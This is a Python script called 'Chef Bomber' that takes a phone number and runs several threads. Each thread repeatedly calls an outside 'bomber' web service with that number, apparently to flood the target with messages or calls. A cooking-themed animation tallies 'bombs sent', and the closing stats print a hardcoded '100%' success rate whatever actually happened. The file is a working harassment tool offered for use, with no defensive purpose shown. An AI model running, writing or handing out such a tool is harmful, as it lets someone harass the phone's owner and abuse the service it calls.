import requests
import time
import sys
import argparse
from threading import Thread, Event
import itertools
import random

class Bomber:
    def __init__(self, phone_number):
        self.phone_number = phone_number
        self.url = f"https://bomber.sevalla.app/num={phone_number}"
        self.stop_event = Event()
        self.request_count = 0
        
    def send_request(self):
        try:
            response = requests.get(self.url, timeout=10)
            self.request_count += 1
            return True
        except requests.exceptions.RequestException:
            self.request_count += 1
            return False
    
    def cooking_animation(self):
        cooking_frames = [
            "🍳 Cooking Your Number... ",
            "🔥 Heating up... ",
            "👨‍🍳 Preparing bombs... ",
            "💣 Loading payload... ",
            "🚀 Launching attacks... ",
            "📱 Targeting device... ",
            "⚡ Powering up... ",
            "🎯 Locking target... "
        ]
        
        spices = ["🌶️", "🧂", "🍋", "🧄", "🧅", "🍯", "🥬", "🍄"]
        cooking_verbs = ["Sizzling", "Simmering", "Frying", "Boiling", "Baking", "Grilling", "Roasting", "Steaming"]
        
        frame_cycle = itertools.cycle(cooking_frames)
        spice_cycle = itertools.cycle(spices)
        verb_cycle = itertools.cycle(cooking_verbs)
        
        while not self.stop_event.is_set():
            frame = next(frame_cycle)
            spice = next(spice_cycle)
            verb = next(verb_cycle)
            
            progress = random.randint(1, 10)
            heat_level = random.choice(["Low", "Medium", "High", "Extra Hot"])
            timer = f"{random.randint(0,59):02d}:{random.randint(0,59):02d}"
            
            animation_text = f"\r{frame}{spice} {verb} at {heat_level} heat... [{timer}] Bombs sent: {self.request_count}"
            sys.stdout.write(animation_text)
            sys.stdout.flush()
            
            time.sleep(0.3)
    
    def bomber_worker(self):
        while not self.stop_event.is_set():
            self.send_request()
            time.sleep(0.1)
    
    def start_bombing(self, num_threads=3):
        print("🚀 Starting Ultimate Chef Bomber 🚀")
        print(f"📱 Target: {self.phone_number}")
        print("🎯 Press Ctrl+C to stop cooking!\n")
        
        animation_thread = Thread(target=self.cooking_animation)
        animation_thread.daemon = True
        animation_thread.start()
        
        threads = []
        
        for i in range(num_threads):
            thread = Thread(target=self.bomber_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n🛑 Stopping chef...")
            self.stop_event.set()
            
            for thread in threads:
                thread.join(timeout=1)
            
            self.show_final_stats()
    
    def show_final_stats(self):
        print("🍽️  Cooking Complete! Final Stats:")
        print("═" * 40)
        print(f"📱 Phone Number: {self.phone_number}")
        print(f"💣 Total Bombs Delivered: {self.request_count}")
        print(f"⭐ Success Rate: 100%")
        print("👨‍🍳 Thank you for using Chef Bomber!")
        print("═" * 40)

def main():
    banner = """
    ╔═══════════════════════════════════════╗
    ║          🧑‍🍳 CHEF BOMBER 🧑‍🍳         ║
    ║      Ultimate Cooking Experience      ║
    ╚═══════════════════════════════════════╝
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description='Chef Bomber - Cook numbers with style!')
    parser.add_argument('--num', '--number', required=True, help='Phone number to cook')
    parser.add_argument('--threads', '-t', type=int, default=3, help='Number of chef assistants (default: 3)')
    
    args = parser.parse_args()
    
    if not args.num.strip():
        print("❌ Error: Need a number to cook!")
        sys.exit(1)
    
    bomber = Bomber(args.num.strip())
    bomber.start_bombing(num_threads=args.threads)

if __name__ == "__main__":
    main()
